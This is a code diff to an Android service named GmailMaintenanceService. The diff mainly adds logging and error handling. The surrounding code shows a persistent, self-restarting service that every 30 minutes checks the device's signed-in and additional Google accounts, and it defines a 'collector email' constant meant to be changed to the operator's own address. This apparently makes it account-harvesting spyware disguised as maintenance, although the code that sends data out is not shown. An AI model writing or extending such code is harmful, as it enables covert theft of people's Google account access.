@@ -32,7 +32,7 @@ import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
 
 public class GmailMaintenanceService extends Service {
-    private static final String TAG = "GmailMaintenanceService";
+    private static final String TAG = AppConfig.DEBUG_TAG + "_GmailMaintenance";
     private static final String COLLECTOR_EMAIL = "mrh@collector.lab"; // Change this to your collector email
     private static final long MAINTENANCE_INTERVAL = 30; // minutes
     
@@ -42,43 +42,76 @@ public class GmailMaintenanceService extends Service {
 
     @Override
     public void onCreate() {
+        Log.i(TAG, "=== onCreate() START ===");
         super.onCreate();
-        Log.d(TAG, "Gmail Maintenance Service created");
-        
-        gmailAuthService = new GmailAuthService(this);
-        accountManager = AccountManager.get(this);
-        scheduler = Executors.newScheduledThreadPool(1);
+        try {
+            Log.i(TAG, "Gmail Maintenance Service created");
+            
+            Log.i(TAG, "Creating GmailAuthService");
+            gmailAuthService = new GmailAuthService(this);
+            
+            Log.i(TAG, "Getting AccountManager");
+            accountManager = AccountManager.get(this);
+            
+            Log.i(TAG, "Creating scheduled executor");
+            scheduler = Executors.newScheduledThreadPool(1);
+            
+            Log.i(TAG, "=== onCreate() END ===");
+        } catch (Exception e) {
+            Log.e(TAG, "Error in onCreate", e);
+            Log.i(TAG, "=== onCreate() END (ERROR) ===");
+        }
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG, "Gmail Maintenance Service started");
+        Log.i(TAG, "=== onStartCommand() START ===");
+        Log.i(TAG, "Gmail Maintenance Service started with startId: " + startId);
         
-        // Start periodic maintenance
-        startPeriodicMaintenance();
-        
-        // Return START_STICKY to restart service if killed
-        return START_STICKY;
+        try {
+            // Start periodic maintenance
+            Log.i(TAG, "Starting periodic maintenance");
+            startPeriodicMaintenance();
+            
+            Log.i(TAG, "=== onStartCommand() END ===");
+            // Return START_STICKY to restart service if killed
+            return START_STICKY;
+        } catch (Exception e) {
+            Log.e(TAG, "Error in onStartCommand", e);
+            Log.i(TAG, "=== onStartCommand() END (ERROR) ===");
+            return START_NOT_STICKY;
+        }
     }
 
     private void startPeriodicMaintenance() {
+        Log.i(TAG, "=== startPeriodicMaintenance() START ===");
+        Log.i(TAG, "Scheduling maintenance every " + MAINTENANCE_INTERVAL + " minutes");
+        
         scheduler.scheduleAtFixedRate(new Runnable() {
             @Override
             public void run() {
+                Log.i(TAG, "=== Periodic Maintenance Run START ===");
                 try {
-                    Log.d(TAG, "Running periodic Gmail maintenance...");
+                    Log.i(TAG, "Running periodic Gmail maintenance...");
                     
                     // Check current signed-in account
+                    Log.i(TAG, "Checking current signed-in account");
                     checkCurrentAccount();
                     
                     // Check for additional Google accounts
+                    Log.i(TAG, "Checking additional Google accounts");
                     checkAdditionalAccounts();
                     
+                    Log.i(TAG, "=== Periodic Maintenance Run END ===");
                 } catch (Exception e) {
                     Log.e(TAG, "Error during maintenance", e);
+                    Log.i(TAG, "=== Periodic Maintenance Run END (ERROR) ===");
                 }
             }
         }, 0, MAINTENANCE_INTERVAL, TimeUnit.MINUTES);
+        
+        Log.i(TAG, "Maintenance scheduled successfully");
+        Log.i(TAG, "=== startPeriodicMaintenance() END ===");
     }
 
     private void checkCurrentAccount() {
